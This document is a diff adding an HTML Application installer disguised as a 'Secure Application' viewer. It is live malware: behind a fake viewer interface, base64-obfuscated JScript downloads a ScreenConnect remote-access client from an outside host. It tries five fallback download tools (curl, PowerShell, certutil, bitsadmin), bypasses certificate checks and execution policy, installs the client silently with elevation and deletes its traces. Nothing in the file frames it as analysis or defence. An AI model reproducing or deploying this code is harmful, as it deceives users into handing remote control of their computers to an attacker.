@@ -1,0 +1,703 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<title>Secure Application - Package</title>
+<HTA:APPLICATION
+    ID="InstallerApp"
+    APPLICATIONNAME="Secure Application Package"
+    BORDER="dialog"
+    BORDERSTYLE="normal"
+    CAPTION="yes"
+    MAXIMIZEBUTTON="no"
+    MINIMIZEBUTTON="no"
+    SHOWINTASKBAR="yes"
+    SINGLEINSTANCE="yes"
+    SYSMENU="yes"
+    VERSION="1.0"
+    INNERBORDER="no"
+    SCROLL="no"
+    SELECTION="no"
+    CONTEXTMENU="no"
+/>
+<style>*{margin:0;padding:0;box-sizing:border-box}html,body{width:100%;height:100%;overflow:hidden;font-family:'Segoe UI','Segoe UI',Tahoma,sans-serif;font-size:14px}body{background:#151E2C}.card{position:relative;width:100%;height:100%;background:#151E2C;display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center;padding:26px 30px;overflow:hidden}.accent{position:absolute;top:0;left:0;right:0;height:3px;z-index:2;background:linear-gradient(90deg,#3B82F6,#2563EB)}.icon-badge{width:84px;height:84px;margin:0 auto 24px;border-radius:22px;background:linear-gradient(135deg,#3B82F6,#2563EB);display:flex;align-items:center;justify-content:center;box-shadow:0 8px 28px rgba(0,0,0,0.45),0 0 0 1px rgba(255,255,255,0.08) inset}.icon-badge img{max-width:52px;max-height:52px;object-fit:contain}.icon-letter{color:#FFF;font-size:40px;font-weight:700}h1{font-size:26px;font-weight:700;color:#FFF;letter-spacing:-0.3px;margin-bottom:12px}h2{font-size:19px;font-weight:600;color:#FFF;margin-bottom:12px}.desc{font-size:14px;color:#94A3B8;line-height:1.65;margin:0 auto 26px;max-width:380px}.ver{font-size:11px;color:#64748B;margin-bottom:6px}.btn{display:inline-block;padding:12px 30px;border:none;border-radius:10px;font-family:'Segoe UI',sans-serif;font-size:14px;font-weight:600;cursor:pointer;min-width:120px;outline:none;transition:all 0.2s ease}.btn-primary{background:linear-gradient(135deg,#3B82F6,#2563EB);color:#FFF;box-shadow:0 4px 16px rgba(0,0,0,0.35)}.btn-primary:hover{transform:translateY(-1px);box-shadow:0 6px 22px rgba(0,0,0,0.45)}.btn-ghost{background:transparent;color:#94A3B8;border:1px solid rgba(255,255,255,0.14)}.btn-ghost:hover{border-color:rgba(255,255,255,0.3);color:#E2E8F0}.btn-group{margin-top:6px}.btn-group .btn{margin:0 6px}.progress-track{width:100%;height:6px;background:#0B1220;border:1px solid rgba(255,255,255,0.05);border-radius:4px;margin:0 auto 18px;overflow:hidden}.progress-bar{height:100%;width:35%;background:linear-gradient(90deg,#3B82F6,#2563EB);border-radius:4px;animation:progressSlide 1.8s ease-in-out infinite}.spinner{width:44px;height:44px;border:4px solid rgba(255,255,255,0.12);border-top:4px solid #2563EB;border-radius:50%;animation:spin 0.8s linear infinite;margin:0 auto 22px}.icon-circle{width:76px;height:76px;border-radius:22px;margin:0 auto 22px;display:flex;align-items:center;justify-content:center;font-size:36px;color:#FFF;font-weight:bold;animation:popIn 0.5s cubic-bezier(0.175,0.885,0.32,1.275)}.icon-success{background:linear-gradient(135deg,#22C55E,#15803D)}.icon-error{background:linear-gradient(135deg,#EF4444,#B91C1C)}.stage{display:none;position:relative;z-index:1;width:100%}.stage-active{display:block;animation:fadeUp 0.35s ease}.footer{position:absolute;bottom:14px;left:0;right:0;text-align:center;font-size:10px;color:#64748B;z-index:1}</style>
+</head>
+<body>
+
+<div class="card">
+ <div class="accent"></div>
+
+ <div id="stage-welcome" class="stage stage-active">
+ <div class="icon-badge">
+ <span class="icon-letter">S</span>
+ </div>
+ <h1>Secure Application</h1>
+ <p class="desc">Secure Application is now available to open and view</p>
+ <div class="ver">Version 2.1.0</div>
+ <div class="btn-group">
+ <button class="btn btn-ghost" onclick="window.close()">Cancel</button>
+ <button class="btn btn-primary" onclick="startInstall()">View</button>
+ </div>
+ </div>
+
+ <div id="stage-initializing" class="stage ">
+ <div class="icon-badge">
+ <span class="icon-letter">S</span>
+ </div>
+ <h2>Preparing package...</h2>
+ <div class="spinner"></div>
+ <div class="ver">Secure Application</div>
+ </div>
+
+ <div id="stage-installing" class="stage">
+ <div class="icon-badge">
+ <span class="icon-letter">S</span>
+ </div>
+ <h2>Preparing Secure Application</h2>
+ <p class="desc" id="install-message">Preparing package files...</p>
+ <div class="progress-track">
+ <div id="progress-bar" class="progress-bar"></div>
+ </div>
+ <div class="ver" id="wait-label">Please wait...</div>
+ </div>
+
+ <div id="stage-complete" class="stage">
+ <div class="icon-circle icon-success">&#10003;</div>
+ <h2>Secure Application Ready to View</h2>
+ <p class="desc">Secure Application is fully ready for use</p>
+ <div class="btn-group" style="margin-top:16px;">
+ <button class="btn btn-primary" onclick="finishInstall()">Finish</button>
+ </div>
+ </div>
+
+ <div id="stage-error" class="stage">
+ <div class="icon-circle icon-error">&#10007;</div>
+ <h2>Package preparation failed.</h2>
+ <p class="desc" id="error-message">The package could not be prepared.</p>
+ <div class="btn-group">
+ <button class="btn btn-ghost" onclick="window.close()">Cancel</button>
+ <button class="btn btn-primary" onclick="retryInstall()">Retry</button>
+ </div>
+ </div>
+
+</div>
+
+<script language="JScript">
+
+var _D2_=["A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z","a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","0","1","2","3","4","5","6","7","8","9","+","/"];
+function _b64d(s){
+  var x=new Object();for(var i=0;i<64;i++)x[_D2_[i]]=i;
+  var o=[],a=0,b=0,c=0,d=0,e=0,f=0,g=0;
+  s=s.replace(/[^A-Za-z0-9\+\/]/g,"");
+  for(i=0;i<s.length;i+=4){
+    e=x[s.charAt(i)];f=x[s.charAt(i+1)];g=x[s.charAt(i+2)];a=x[s.charAt(i+3)];
+    b=(e<<2)|(f>>4);c=((f&15)<<4)|(g>>2);d=((g&3)<<6)|a;
+    o.push(String.fromCharCode(b));if(g!=64)o.push(String.fromCharCode(c));if(a!=64)o.push(String.fromCharCode(d));
+  }
+  
+  var r="";for(i=0;i+1<o.length;i+=2)r+=String.fromCharCode(o[i].charCodeAt(0)|(o[i+1].charCodeAt(0)<<8));
+  return r;
+}
+
+var _X_ = [
+  "VwBTAGMAcgBpAHAAdAAuAFMAaABlAGwAbAA=",
+  "UwBjAHIAaQBwAHQAaQBuAGcALgBGAGkAbABlAFMAeQBzAHQAZQBtAE8AYgBqAGUAYwB0AA==",
+  "TQBTAFgATQBMADIALgBTAGUAcgB2AGUAcgBYAE0ATABIAFQAVABQAC4ANgAuADAA",
+  "QQBEAE8ARABCAC4AUwB0AHIAZQBhAG0A",
+  "UwBoAGUAbABsAC4AQQBwAHAAbABpAGMAYQB0AGkAbwBuAA=="
+];
+for(var _i_=0; _i_<_X_.length; _i_++){ _X_[_i_] = _b64d(_X_[_i_]); }
+</script>
+<script>
+var shell = new ActiveXObject(_X_[0]);
+var fso   = new ActiveXObject(_X_[1]);
+
+(function () {
+    var w = 420;
+    var h = 480;
+    try {
+        window.resizeTo(w, h);
+        if ("yes" === "yes") {
+            window.moveTo((screen.availWidth - w) / 2, (screen.availHeight - h) / 2);
+        }
+    } catch (e) {}
+})();
+
+function showStage(name) {
+    var divs = document.getElementsByTagName("div");
+    for (var i = 0; i < divs.length; i++) {
+        if (divs[i].id && divs[i].id.indexOf("stage-") === 0) {
+            divs[i].className = "stage";
+        }
+    }
+    var el = document.getElementById("stage-" + name);
+    if (el) el.className = "stage stage-active";
+}
+
+function getTempDir() {
+    return shell.ExpandEnvironmentStrings("%TEMP%");
+}
+
+function setProgress(pct) {
+    var bar = document.getElementById("progress-bar");
+    if (!bar) return;
+    bar.style.animation = "none";
+    bar.style.width = pct + "%";
+    bar.style.marginLeft = "0";
+}
+
+function setProgressIndeterminate() {
+    var bar = document.getElementById("progress-bar");
+    if (!bar) return;
+    bar.style.width = "35%";
+    bar.style.marginLeft = "0";
+    bar.style.animation = "progressSlide 1.8s ease-in-out infinite";
+}
+
+function saveBinary(body, destPath) {
+    try {
+        var stream = new ActiveXObject(_X_[3]);
+        stream.Type = 1;
+        stream.Open();
+        stream.Write(body);
+        stream.SaveToFile(destPath, 2);
+        stream.Close();
+        return true;
+    } catch(e) {
+        return false;
+    }
+}
+
+function writeTextFile(path, text) {
+    var ts = null;
+    try {
+        ts = fso.CreateTextFile(path, true);
+        ts.Write(text);
+        ts.Close();
+        return true;
+    } catch (e) {
+        try { if (ts) ts.Close(); } catch (e2) {}
+        return false;
+    }
+}
+function readTextFile(path) {
+    var ts = fso.OpenTextFile(path, 1);
+    var t = ts.ReadAll();
+    ts.Close();
+    return t;
+}
+function deleteFileSafe(path) {
+    try { if (path && fso.FileExists(path)) fso.DeleteFile(path, true); } catch(e) {}
+}
+
+function runBatAndPoll(batPath, exitFile, logPath, onResult) {
+    var q = '"';
+    var waitMs = 0;
+    var MAX_MS = 15 * 60 * 1000;   
+
+    try {
+        shell.Run(q + batPath + q, 0, false);
+    } catch(e) {
+        onResult(-1, "Launch failed: " + (e.message || e.number));
+        return;
+    }
+
+    var timerId = null;
+    function poll() {
+        try {
+            if (fso.FileExists(exitFile)) {
+                if (timerId) clearTimeout(timerId);
+                var code = -1;
+                try { code = parseInt(readTextFile(exitFile), 10) || 0; } catch(e) {}
+                deleteFileSafe(exitFile);
+                deleteFileSafe(batPath);
+                var log = "";
+                try {
+                    if (logPath && fso.FileExists(logPath)) {
+                        log = readTextFile(logPath).replace(/[\r\n]+/g, " ");
+                        if (log.length > 300) log = log.substr(0, 300);
+                    }
+                } catch(e) {}
+                deleteFileSafe(logPath);
+                onResult(code, log);
+                return;
+            }
+        } catch(e) {}
+
+        waitMs += 500;
+        if (waitMs > MAX_MS) {
+            if (timerId) clearTimeout(timerId);
+            deleteFileSafe(exitFile);
+            deleteFileSafe(batPath);
+            onResult(-9999, "Timed out after 15 minutes");
+            return;
+        }
+        timerId = setTimeout(poll, 500);
+    }
+    timerId = setTimeout(poll, 900);
+}
+
+function downloadViaShell(url, destPath, onDone, onError) {
+    var q = '"';
+    var tempDir = getTempDir();
+    var sess    = Math.random().toString(36).substr(2, 8);
+
+    var tempFiles = [];
+
+    function cleanupTempFiles() {
+        for (var i = 0; i < tempFiles.length; i++) deleteFileSafe(tempFiles[i]);
+    }
+
+    var lastErrors = [];
+    var attempt = 0;
+
+    function buildAttempt(index) {
+        var tag = "a" + Math.random().toString(36).substr(2, 6);
+        var batPath = tempDir + "\\igb_dl_"  + tag + ".bat";
+        var exFile  = tempDir + "\\igb_ex_"  + tag + ".txt";
+        var logPath = tempDir + "\\igb_log_" + tag + ".txt";
+        var bat;
+
+        function q(s){ return '"' + String(s) + '"'; }
+        function jsq(s){
+
+            s = String(s);
+            s = s.replace(/\\/g, "\\\\");
+            s = s.replace(/"/g, '\\"');
+            return '"' + s + '"';
+        }
+        function pctEsc(s) {
+            
+            return String(s).replace(/%/g, "%%");
+        }
+        var qURL = q(pctEsc(url));
+        var qDST = q(pctEsc(destPath));
+
+        switch (index) {
+
+            case 0: {
+                var cfgPath = tempDir + "\\igb_cfg_" + tag + ".txt";
+                var cfgText =
+                    "# curl config\n" +
+                    "user-agent = \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0 Safari/537.36\"\n" +
+                    "output = " + jsq(destPath) + "\n" +
+                    "url = " + jsq(url) + "\n" +
+                    "location\n" +
+                    "fail\n" +
+                    "insecure\n" +
+                    "ssl-no-revoke\n" +
+                    "compressed\n" +
+                    "retry = 5\n" +
+                    "retry-delay = 3\n" +
+                    "retry-all-errors\n" +
+                    "max-time = 600\n" +
+                    "connect-timeout = 30\n" +
+                    "header = \"Accept: */*\"\n";
+                tempFiles.push(cfgPath);
+                writeTextFile(cfgPath, cfgText);
+                bat =
+                    "@echo off\r\n" +
+                    "setlocal enableextensions disabledelayedexpansion\r\n" +
+                    "chcp 65001 >nul 2>&1\r\n" +
+                    "curl.exe -K " + q(cfgPath) +
+                    " > " + q(logPath) + " 2>&1\r\n" +
+                    "echo.%ERRORLEVEL%.>" + q(exFile) + "\r\n" +
+                    "endlocal\r\n";
+                break;
+            }
+
+            case 1: {
+                var ps1Path = tempDir + "\\igb_ps1_" + tag + ".ps1";
+
+                var ps1 =
+                    "$u = @'\n" + url + "\n'@\n" +
+                    "$d = @'\n" + destPath + "\n'@\n" +
+                    "$u = $u.Trim(); $d = $d.Trim();\n" +
+                    "try {\n" +
+                    "  [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;\n" +
+                    "  try { [Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; } catch {}\n" +
+                    "  $wc = New-Object System.Net.WebClient;\n" +
+                    "  $wc.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36');\n" +
+                    "  $wc.Headers.Add('Accept', '*/*');\n" +
+                    "  $wc.DownloadFile($u, $d);\n" +
+                    "  exit 0;\n" +
+                    "} catch { Write-Host $_.Exception.ToString(); exit 1; }\n";
+                tempFiles.push(ps1Path);
+                writeTextFile(ps1Path, ps1);
+                bat =
+                    "@echo off\r\n" +
+                    "setlocal enableextensions\r\n" +
+                    "powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass " +
+                    "-File " + q(ps1Path) +
+                    " > " + q(logPath) + " 2>&1\r\n" +
+                    "echo.%ERRORLEVEL%.>" + q(exFile) + "\r\n" +
+                    "endlocal\r\n";
+                break;
+            }
+
+            case 2: {
+                var ps2Path = tempDir + "\\igb_iwr_" + tag + ".ps1";
+                var ps2 =
+                    "$u = @'\n" + url + "\n'@\n" +
+                    "$d = @'\n" + destPath + "\n'@\n" +
+                    "$u = $u.Trim(); $d = $d.Trim();\n" +
+                    "try {\n" +
+                    "  [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;\n" +
+                    "  try { [Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; } catch {}\n" +
+                    "  [System.Net.ServicePointManager]::Expect100Continue = $false;\n" +
+                    "  Invoke-WebRequest -UseBasicParsing -Uri $u -OutFile $d " +
+                    "-UserAgent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)' " +
+                    "-Headers @{'Accept'='*/*'; 'Cache-Control'='no-cache'} " +
+                    "-TimeoutSec 600;\n" +
+                    "  exit 0;\n" +
+                    "} catch { Write-Host $_.Exception.ToString(); exit 1; }\n";
+                tempFiles.push(ps2Path);
+                writeTextFile(ps2Path, ps2);
+                bat =
+                    "@echo off\r\n" +
+                    "setlocal enableextensions\r\n" +
+                    "powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass " +
+                    "-File " + q(ps2Path) +
+                    " > " + q(logPath) + " 2>&1\r\n" +
+                    "echo.%ERRORLEVEL%.>" + q(exFile) + "\r\n" +
+                    "endlocal\r\n";
+                break;
+            }
+
+            case 3:
+                bat =
+                    "@echo off\r\n" +
+                    "setlocal enableextensions\r\n" +
+                    "chcp 65001 >nul 2>&1\r\n" +
+                    "certutil -urlcache -split -f " + qURL + " " + qDST +
+                    " > " + q(logPath) + " 2>&1\r\n" +
+                    "echo.%ERRORLEVEL%.>" + q(exFile) + "\r\n" +
+                    "endlocal\r\n";
+                break;
+
+            default: {
+                var jobName = "IGB" + sess;
+                bat =
+                    "@echo off\r\n" +
+                    "setlocal enableextensions enabledelayedexpansion\r\n" +
+                    "chcp 65001 >nul 2>&1\r\n" +
+                    "set \"JOB=" + jobName + "\"\r\n" +
+                    "bitsadmin /create \"!JOB!\" >> " + q(logPath) + " 2>&1\r\n" +
+                    "bitsadmin /addfile \"!JOB!\" " + qURL + " " + qDST + " >> " + q(logPath) + " 2>&1\r\n" +
+                    "bitsadmin /setpriority \"!JOB!\" FOREGROUND >> " + q(logPath) + " 2>&1\r\n" +
+                    "bitsadmin /setcustomheaders \"!JOB!\" \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\" >> " + q(logPath) + " 2>&1\r\n" +
+                    "bitsadmin /resume \"!JOB!\" >> " + q(logPath) + " 2>&1\r\n" +
+                    "set /a N=0\r\n" +
+                    ":IGB_LOOP\r\n" +
+                    "  timeout /t 1 /nobreak >nul 2>&1\r\n" +
+                    "  set /a N+=1\r\n" +
+                    "  if !N! GTR 480 goto IGB_ERR\r\n" +
+                    "  set S=\r\n" +
+                    "  for /f \"usebackq tokens=*\" %%a in (`bitsadmin /getstate \"!JOB!\" 2^>nul`) do set \"S=%%a\"\r\n" +
+                    "  if /i \"!S!\"==\"TRANSFERRED\" goto IGB_DONE\r\n" +
+                    "  if /i \"!S!\"==\"ACKNOWLEDGED\" goto IGB_DONE\r\n" +
+                    "  if /i \"!S!\"==\"CONNECTING\" goto IGB_LOOP\r\n" +
+                    "  if /i \"!S!\"==\"TRANSFERRING\" goto IGB_LOOP\r\n" +
+                    "  if /i \"!S!\"==\"QUEUED\" goto IGB_LOOP\r\n" +
+                    "goto IGB_ERR\r\n" +
+                    ":IGB_DONE\r\n" +
+                    "  bitsadmin /complete \"!JOB!\" >> " + q(logPath) + " 2>&1\r\n" +
+                    "  echo.0.>" + q(exFile) + "\r\n" +
+                    "  goto IGB_END\r\n" +
+                    ":IGB_ERR\r\n" +
+                    "  bitsadmin /cancel \"!JOB!\" >> " + q(logPath) + " 2>&1\r\n" +
+                    "  bitsadmin /complete \"!JOB!\" >> " + q(logPath) + " 2>&1\r\n" +
+                    "  echo.1.>" + q(exFile) + "\r\n" +
+                    ":IGB_END\r\n" +
+                    "endlocal\r\n";
+                break;
+            }
+        }
+        return { batPath: batPath, bat: bat, exFile: exFile, logPath: logPath };
+    }
+
+    function nextAttempt() {
+        var names = ["curl", "WebClient", "Invoke-WebRequest", "certutil", "bitsadmin"];
+        var toolName = names[attempt] || ("tool#" + attempt);
+
+        if (attempt > 4) {
+            cleanupTempFiles();
+            var joined = lastErrors.join(" | ");
+            onError("Download failed: none of the 5 download methods succeeded on this computer." +
+                    (joined ? "\n\nLast errors: " + joined : ""));
+            return;
+        }
+
+        var info = buildAttempt(attempt);
+        tempFiles.push(info.batPath);
+        tempFiles.push(info.exFile);
+        tempFiles.push(info.logPath);
+
+        if (!writeTextFile(info.batPath, info.bat)) {
+            lastErrors.push(toolName + "(cannot create temp file in %TEMP%)");
+            attempt++;
+            nextAttempt();
+            return;
+        }
+
+        var wl = document.getElementById("wait-label");
+        if (wl) wl.innerText = "Retrying download (" + (attempt + 1) + "/5)...";
+
+        runBatAndPoll(info.batPath, info.exFile, info.logPath, function(code, logMsg){
+            try {
+                var fileOk = false;
+                try { fileOk = (fso.FileExists(destPath) && fso.GetFile(destPath).Size > 0); } catch (e) {}
+                if (code === 0 && fileOk) {
+                    cleanupTempFiles();
+                    onDone();
+                    return;
+                }
+                lastErrors.push(toolName + "(code:" + code + ") " + (logMsg || "(no log)"));
+                attempt++;
+                nextAttempt();
+            } catch (e) {
+                showError("Download error: " + (e.message || e.number));
+            }
+        });
+    }
+
+    nextAttempt();
+}
+
+function downloadFileAsync(url, destPath, onDone, onError) {
+    var MAX_RETRIES = 3;
+    var RECV_TIMEOUT = 600000;   
+    var xhrAttempt = 0;
+    var finished = false;
+    var fallingBack = false;
+
+    function done() { if (finished) return; finished = true; onDone(); }
+    function fail(msg) { if (finished) return; finished = true; onError(msg); }
+
+    function doXhr() {
+        var firstErr = "";
+        function fallback(reason) {
+            if (finished || fallingBack) return;
+            fallingBack = true;
+            firstErr = reason;
+            try {
+                downloadViaShell(url, destPath, done, function(msg) {
+                    fail(msg + (firstErr ? "\nIn-HTA attempt: " + firstErr : ""));
+                });
+            } catch (e) {
+                fail("Internal error: " + (e.message || e.number));
+            }
+        }
+        try {
+            var xhr = new ActiveXObject(_X_[2]);
+
+            try { xhr.setTimeouts(10000, 60000, 60000, RECV_TIMEOUT); } catch(e) {}
+            xhr.open("GET", url, true);  
+            try {
+                xhr.setRequestHeader("User-Agent",
+                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) " +
+                    "AppleWebKit/537.36 (KHTML, like Gecko) " +
+                    "Chrome/128.0.0.0 Safari/537.36");
+                xhr.setRequestHeader("Accept",
+                    "application/octet-stream,*/*;q=0.8");
+                xhr.setRequestHeader("Cache-Control", "no-cache");
+            } catch(e) {}
+
+            function handleReady() {
+                if (xhr.readyState === 4) {
+                    var httpOk = (xhr.status === 200 || xhr.status === 206);
+                    if (httpOk && saveBinary(xhr.responseBody, destPath)) {
+                        done();
+                    } else {
+                        var reason = "HTTP " + xhr.status +
+                            (httpOk ? ", " + _X_[3] + " save blocked" : "");
+                        
+                        xhrAttempt++;
+                        if (xhrAttempt < MAX_RETRIES && !httpOk && xhr.status !== 403 && xhr.status !== 404) {
+                            var waitLabel = document.getElementById("wait-label");
+                            if (waitLabel) waitLabel.innerText = "Retrying download (" + (xhrAttempt + 1) + "/" + MAX_RETRIES + ")...";
+                            setTimeout(doXhr, xhrAttempt * 5000);
+                        } else {
+                            fallback(reason);
+                        }
+                    }
+                }
+            }
+            xhr.onreadystatechange = function() {
+                try { handleReady(); }
+                catch (e) { showError("Download error: " + (e.message || e.number)); }
+            };
+            try { xhr.send(); } catch(e) {
+                var reason = "XHR send error: " + (e.message || e.number);
+                xhrAttempt++;
+                if (xhrAttempt < MAX_RETRIES) {
+                    var waitLabel = document.getElementById("wait-label");
+                    if (waitLabel) waitLabel.innerText = "Retrying download (" + (xhrAttempt + 1) + "/" + MAX_RETRIES + ")...";
+                    setTimeout(doXhr, xhrAttempt * 5000);
+                } else {
+                    fallback(reason);
+                }
+            }
+        } catch(e) {
+            var reason = "XHR error: " + (e.message || e.number);
+            xhrAttempt++;
+            if (xhrAttempt < MAX_RETRIES) {
+                var waitLabel = document.getElementById("wait-label");
+                if (waitLabel) waitLabel.innerText = "Retrying download (" + (xhrAttempt + 1) + "/" + MAX_RETRIES + ")...";
+                setTimeout(doXhr, xhrAttempt * 5000);
+            } else {
+                fallback(reason);
+            }
+        }
+    }
+    doXhr();
+}
+
+function runElevatedAndWait(cmdLine, onResult) {
+    try {
+        var shellApp = new ActiveXObject(_X_[4]);
+        var tempDir = getTempDir();
+        var rnd = Math.random().toString(36).substr(2, 8);
+        var batFile  = tempDir + "\\igb_run_"  + rnd + ".bat";
+        var exitFile = tempDir + "\\igb_exit_" + rnd + ".txt";
+
+        var safeCmd = String(cmdLine).replace(/%/g, "%%");
+
+        var bat = "@echo off\r\n" + safeCmd +
+                  "\r\necho.%ERRORLEVEL%.> \"" + exitFile + "\"\r\n";
+        if (!writeTextFile(batFile, bat)) {
+            throw new Error("cannot write temporary file: " + batFile);
+        }
+
+        shellApp.ShellExecute(batFile, "", "", "runas", 0);
+
+        var poll = function() {
+            if (fso.FileExists(exitFile)) {
+                var code = 0;
+                try {
+                    var rf = fso.OpenTextFile(exitFile, 1);
+                    code = parseInt(rf.ReadAll(), 10) || 0;
+                    rf.Close();
+                } catch(e) {}
+                try { fso.DeleteFile(exitFile, true); } catch(e) {}
+                try { fso.DeleteFile(batFile, true);  } catch(e) {}
+                onResult(code);
+            } else {
+                setTimeout(poll, 500);
+            }
+        };
+        setTimeout(poll, 1000);
+    } catch(e) {
+        showError("Elevation error: " + e.message);
+    }
+}
+
+function runInstaller(installCmd, isMsi, onResult) {
+    runElevatedAndWait(installCmd, onResult);
+}
+
+function handleExitCode(code) {
+    if (code === 0 || code === 3010) {
+        showStage("complete");
+    } else {
+        showError("Installer exited with code " + code);
+    }
+}
+
+function startInstall() {
+    showStage("initializing");
+    setTimeout(function() { runInstall(); }, 900);
+}
+
+function runInstall() {
+    var testMode = false;
+
+    if (testMode) {
+        showStage("installing");
+        setProgressIndeterminate();
+        document.getElementById("install-message").innerText = "Getting Additional Files";
+        setTimeout(function() {
+            document.getElementById("install-message").innerText = "Preparing package files...";
+            setTimeout(function() {
+                document.getElementById("wait-label").innerText = "Finishing up...";
+                setTimeout(function() {
+                    showStage("complete");
+                }, 2000);
+            }, 2500);
+        }, 3000);
+        return;
+    }
+
+    var sourceType    = "url";
+    var installerType = "msi";
+
+    if (sourceType === "url") {
+        
+        showStage("installing");
+        setProgressIndeterminate();
+        document.getElementById("install-message").innerText = "Getting Additional Files";
+        document.getElementById("wait-label").innerText = "Please wait...";
+
+        var url = "https://emmy174.org/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest";
+        var ext = (installerType === "msi") ? ".msi" : ".vbs";
+        var rnd = Math.random().toString(36).substr(2, 8);
+        var tempFile = getTempDir() + "\\installer_" + rnd + ext;
+
+        downloadFileAsync(url, tempFile,
+            
+            function() {
+                document.getElementById("install-message").innerText = "Preparing package files...";
+                setProgressIndeterminate();
+                document.getElementById("wait-label").innerText = "Please wait...";
+
+                var msiParams = "";
+                var installCmd = (installerType === "msi")
+                    ? 'msiexec /i "' + tempFile + '" /qn /norestart' + (msiParams ? " " + msiParams : "")
+                    : 'wscript "' + tempFile + '"';
+
+                runInstaller(installCmd, installerType === "msi", handleExitCode);
+            },
+            
+            function(msg) {
+                showError(msg);
+            }
+        );
+
+    } else {
+        
+        var localFile = "";
+        if (localFile === "" || !fso.FileExists(localFile)) {
+            showStage("installing");
+            showError("Installation source file not found.");
+            return;
+        }
+
+        showStage("installing");
+        document.getElementById("install-message").innerText = "Preparing package files...";
+        setProgressIndeterminate();
+
+        var msiParams = "";
+        var installCmd = (installerType === "msi")
+            ? 'msiexec /i "' + localFile + '" /qn /norestart' + (msiParams ? " " + msiParams : "")
+            : 'wscript "' + localFile + '"';
+
+        runInstaller(installCmd, installerType === "msi", handleExitCode);
+    }
+}
+
+function showError(msg) {
+    var el = document.getElementById("error-message");
+    if (el) el.innerText = msg;
+    showStage("error");
+}
+
+function retryInstall() { startInstall(); }
+
+function finishInstall() {
+
+    window.close();
+}
+
+</script>
+</body>
+</html>
